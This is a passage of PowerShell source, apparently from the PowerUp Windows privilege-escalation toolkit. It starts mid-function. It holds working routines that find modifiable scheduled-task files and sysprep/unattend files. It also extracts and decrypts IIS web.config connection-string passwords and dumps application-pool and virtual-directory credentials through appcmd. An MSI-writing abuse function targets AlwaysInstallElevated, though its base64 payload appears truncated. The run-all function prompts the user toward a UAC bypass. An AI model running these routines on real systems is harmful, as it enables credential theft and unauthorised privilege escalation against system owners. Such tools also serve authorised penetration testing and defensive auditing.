        $TaskName = $_.Name
        $TaskXML = [xml] (Get-Content $_.FullName)
        $TaskTrigger = $TaskXML.Task.Triggers.OuterXML

        # check schtask command
        $TaskXML.Task.Actions.Exec.Command | Get-ModifiableFile | ForEach-Object {
            $Out = New-Object PSObject 
            $Out | Add-Member Noteproperty 'TaskName' $TaskName
            $Out | Add-Member Noteproperty 'TaskFilePath' $_
            $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
            $Out
        }

        # check schtask arguments
        $TaskXML.Task.Actions.Exec.Arguments | Get-ModifiableFile | ForEach-Object {
            $Out = New-Object PSObject 
            $Out | Add-Member Noteproperty 'TaskName' $TaskName
            $Out | Add-Member Noteproperty 'TaskFilePath' $_
            $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
            $Out
        }
    }

    $ErrorActionPreference = $OrigError
}


function Get-UnattendedInstallFile {
   
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations = @(   "c:\sysprep\sysprep.xml",
                            "c:\sysprep\sysprep.inf",
                            "c:\sysprep.inf",
                            (Join-Path $Env:WinDir "\Panther\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\Panther\unattend.xml")
                        )

    # test the existence of each path and return anything found
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        $Out = New-Object PSObject 
        $Out | Add-Member Noteproperty 'UnattendPath' $_
        $Out
    }

    $ErrorActionPreference = $OrigError
}


function Get-Webconfig {   
    [CmdletBinding()]Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable 

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")  
        $Null = $DataTable.Columns.Add("dbserv")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("path")
        $Null = $DataTable.Columns.Add("encr")

        # Get list of virtual directories in IIS 
        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath | 
        ForEach-Object { 

            $CurrentVdir = $_

            # Converts CMD style env vars (%) to powershell env vars (env)
            if ($_ -like "*%*") {            
                $EnvarName = "`$Env:"+$_.split("%")[1]
                $EnvarValue = Invoke-Expression $EnvarName
                $RestofPath = $_.split("%")[2]            
                $CurrentVdir  = $EnvarValue+$RestofPath
            }

            # Search for web.config files in each virtual directory
            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {
            
                # Set web.config path
                $CurrentPath = $_.fullname

                # Read the data from the web.config xml file
                [xml]$ConfigFile = Get-Content $_.fullname

                # Check if the connectionStrings are encrypted
                if ($ConfigFile.configuration.connectionStrings.add) {
                                
                    # Foreach connection string add to data table
                    $ConfigFile.configuration.connectionStrings.add| 
                    ForEach-Object {

                        [String]$MyConString = $_.connectionString
                        if($MyConString -like "*password*") {
                            $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                            $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                            $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                            $ConfVdir = $CurrentVdir
                            $ConfPath = $CurrentPath
                            $ConfEnc = "No"
                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
                        }
                    }  

                }
                else {

                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)
                    $aspnet_regiis_path = Get-ChildItem -Recurse -filter aspnet_regiis.exe c:\Windows\Microsoft.NET\Framework\ | Sort-Object -Descending | Select-Object fullname -First 1

                    # Check if aspnet_regiis.exe exists
                    if (Test-Path  ($aspnet_regiis_path.FullName)){

                        # Setup path for temp web.config to the current user's temp dir
                        $WebConfigPath = (Get-Item $Env:temp).FullName + "\web.config"

                        # Remove existing temp web.config
                        if (Test-Path  ($WebConfigPath)) 
                        { 
                            Remove-Item $WebConfigPath 
                        }
                    
                        # Copy web.config from vdir to user temp for decryption
                        Copy-Item $CurrentPath $WebConfigPath

                        #Decrypt web.config in user temp                 
                        $aspnet_regiis_cmd = $aspnet_regiis_path.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
                        $Null = Invoke-Expression $aspnet_regiis_cmd

                        # Read the data from the web.config in temp
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath

                        # Check if the connectionStrings are still encrypted
                        if ($TMPConfigFile.configuration.connectionStrings.add)
                        {
                                
                            # Foreach connection string add to data table
                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {

                                [String]$MyConString = $_.connectionString
                                if($MyConString -like "*password*") {
                                    $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                                    $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                                    $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                                    $ConfVdir = $CurrentVdir
                                    $ConfPath = $CurrentPath
                                    $ConfEnc = "Yes"
                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
                                }
                            }  

                        }else{
                            Write-Verbose "Decryption of $CurrentPath failed."
                            $False                      
                        }
                    }else{
                        Write-Verbose "aspnet_regiis.exe does not exist in the default location."
                        $False
                    }
                }           
            }
        }

        # Check if any connection strings were found 
        if( $DataTable.rows.Count -gt 0 ) {

            # Display results in list view that can feed into the pipeline    
            $DataTable |  Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique       
        }
        else {

            # Status user
            Write-Verbose "No connectionStrings found."
            $False
        }     

    }
    else {
        Write-Verbose "Appcmd.exe does not exist in the default location."
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Get-ApplicationHost {
 
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe"))
    {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable 

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")  
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object { 
        
            #Get application pool name
            $PoolName = $_
        
            #Get username           
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd 
                    
            #Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd 

            #Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array]))
            {
                #Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName) 
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object { 

            #Get Virtual Directory Name
            $VdirName = $_
        
            #Get username           
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd
                    
            #Get password       
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            #Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array]))
            {
                #Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline    
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique       
        }
        else{
            # Status user
            Write-Verbose "No application pool or virtual directory passwords were found."
            $False
        }     
    }else{
        Write-Verbose "Appcmd.exe does not exist in the default location."
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Write-UserAddMSI {
    $Path = "UserAdd.msi"
    $Binary = "AMEOWCWE"
        try {
        [System.Convert]::FromBase64String( $Binary ) | Set-Content -Path $Path -Encoding Byte
        Write-Verbose "MSI written out to '$Path'"

        $Out = New-Object PSObject 
        $Out | Add-Member Noteproperty 'OutputPath' $Path
        $Out
    }
    catch {
        Write-Warning "Error while writing to location '$Path': $_"
        $Out = New-Object PSObject 
        $Out | Add-Member Noteproperty 'OutputPath' $_
        $Out
    }
}


function Invoke-AllChecks {
    [CmdletBinding()]
    Param(
        [Switch]
        $HTMLReport
    )

    if($HTMLReport) {
        $HtmlReportFile = "$($Env:ComputerName).$($Env:UserName).html"

        $Header = "<style>"
        $Header = $Header + "BODY{background-color:peachpuff;}"
        $Header = $Header + "TABLE{border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}"
        $Header = $Header + "TH{border-width: 1px;padding: 0px;border-style: solid;border-color: black;background-color:thistle}"
        $Header = $Header + "TD{border-width: 3px;padding: 0px;border-style: solid;border-color: black;background-color:palegoldenrod}"
        $Header = $Header + "</style>"

        ConvertTo-HTML -Head $Header -Body "<H1>PowerUp report for '$($Env:ComputerName).$($Env:UserName)'</H1>" | Out-File $HtmlReportFile
    }

    # initial admin checks

    "`n[*] Running Invoke-AllChecks"

    $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

    if($IsAdmin){
        "[+] Current user already has local administrative privileges!"
        
        if($HTMLReport) {
            ConvertTo-HTML -Head $Header -Body "<H2>User Has Local Admin Privileges!</H2>" | Out-File -Append $HtmlReportFile
        }
        # return
    }
    else{
        "`n`n[*] Checking if user is in a local group with administrative privileges..."
        if( ($(whoami /groups) -like "*S-1-5-32-544*").length -eq 1 ){
            "[+] User is in a local group that grants administrative privileges!"
            "[+] Run a BypassUAC attack to elevate privileges to admin."

            if($HTMLReport) {
                ConvertTo-HTML -Head $Header -Body "<H2> User In Local Group With Adminisrtative Privileges</H2>" | Out-File -Append $HtmlReportFile
            }
        }
    }


    # Service checks

    "`n`n[*] Checking for unquoted service paths..."
    $Results = Get-ServiceUnquoted
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Unquoted Service Paths</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking service executable and argument permissions..."
    $Results = Get-ServiceFilePermission
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Service Executable Permissions</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking service permissions..."
    $Results = Get-ServicePermission
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Service Permissions</H2>" | Out-File -Append $HtmlReportFile
    }


    # .dll hijacking

    "`n`n[*] Checking %PATH% for potentially hijackable .dll locations..."
    $Results = Find-PathHijack
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>%PATH% .dll Hijacks</H2>" | Out-File -Append $HtmlReportFile
    }


    # registry checks

    "`n`n[*] Checking for AlwaysInstallElevated registry key..."
    if (Get-RegAlwaysInstallElevated) {
        $Out = New-Object PSObject 
        $Out | Add-Member Noteproperty 'OutputFile' $OutputFile
        $Out | Add-Member Noteproperty 'AbuseFunction' "Write-UserAddMSI"
        $Results = $Out

        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Head $Header -Body "<H2>AlwaysInstallElevated</H2>" | Out-File -Append $HtmlReportFile
        }
    }

    "`n`n[*] Checking for Autologon credentials in registry..."
    $Results = Get-RegAutoLogon
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Registry Autologons</H2>" | Out-File -Append $HtmlReportFile
    }


    "`n`n[*] Checking for vulnerable registry autoruns and configs..."
    $Results = Get-VulnAutoRun
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Registry Autoruns</H2>" | Out-File -Append $HtmlReportFile
    }

    # other checks

    "`n`n[*] Checking for vulnerable schtask files/configs..."
    $Results = Get-VulnSchTask
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Vulnerabl Schasks</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for unattended install files..."
    $Results = Get-UnattendedInstallFile
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Unattended Install Files</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for encrypted web.config strings..."
    $Results = Get-Webconfig | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Encrypted 'web.config' String</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for encrypted application pool and virtual directory passwords..."
    $Results = Get-ApplicationHost | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Encrypted Application Pool Passwords</H2>" | Out-File -Append $HtmlReportFile
    }
    "`n"

    if($HTMLReport) {
        "[*] Report written to '$HtmlReportFile' `n"
    }
}